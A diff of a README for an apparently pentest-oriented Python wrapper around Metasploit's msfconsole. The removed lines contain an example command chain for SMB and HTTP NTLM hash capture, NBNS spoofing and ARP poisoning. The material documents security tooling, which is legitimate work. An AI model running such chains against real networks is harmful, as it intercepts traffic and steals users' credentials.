@@ -12,11 +12,13 @@ IS Audits and Consulting, LLC - <http://www.isaudits.net/>
 TJS Deemer Dana - <http://www.tjsdd.com>
 
 -------------------------------------------------------------------------------
-This is a work in process to simplify and expedite execution of Metasploit
-commands from Python:
 
--a parent class for executing metasploit commands 
--subclasses for direct interaction
+This is a work in process to simplify and expedite execution of Metasploit
+commands from Python when it is unnecessary for more complex functionality such
+as MSFRPC. Currently consists of:
+
+-a parent class to handle executing metasploit commands 
+-subclasses for direct interaction in your code
 
 Current functionality is limited to parsing and executing an msfconsole command
 using the msfconsole_command class:
@@ -28,32 +30,7 @@ The "command" attribute should be a string with individual commands separated by
 a semicolon; parse_msfconsole_args builds this string from individual command 
 strings passed as args
 
-For example:
-	myCommand = msf.msfconsole_command("use auxiliary/server/capture/smb",
-	                                   "set srvhost "+ipaddr,
-	                                   "set cainpwfile "+os.path.join(tempdir,"cain"),
-	                                   "set johnpwfile "+os.path.join(tempdir,"john"),
-	                                   "run",
-	                                   "use auxiliary/server/capture/http_ntlm",
-	                                   "set srvhost "+ipaddr,
-	                                   "set cainpwfile "+os.path.join(tempdir,"cain"),
-	                                   "set johnpwfile "+os.path.join(tempdir,"john"),
-	                                   "set uripath /",
-	                                   "set srvport 80",
-	                                   "run",
-	                                   "use auxiliary/spoof/nbns/nbns_response",
-	                                   "set spoofip "+ipaddr,
-	                                   "run"
-	                                   )
-                               
-Commands can also be appended to an existing command prior to execution
-as follows:
-	myCommand.add_msfconsole_args("use auxiliary/spoof/arp/arp_poisoning",
-	                                    "set DHOSTS "+target_ip,
-	                                    "set SHOSTS "+gateway_ip,
-	                                    "set INTERFACE"+iface,
-	                                    "set BIDIRECTIONAL true",
-	                                    "run")
+Example usage is included in the "examples" folder
 
 -------------------------------------------------------------------------------
 
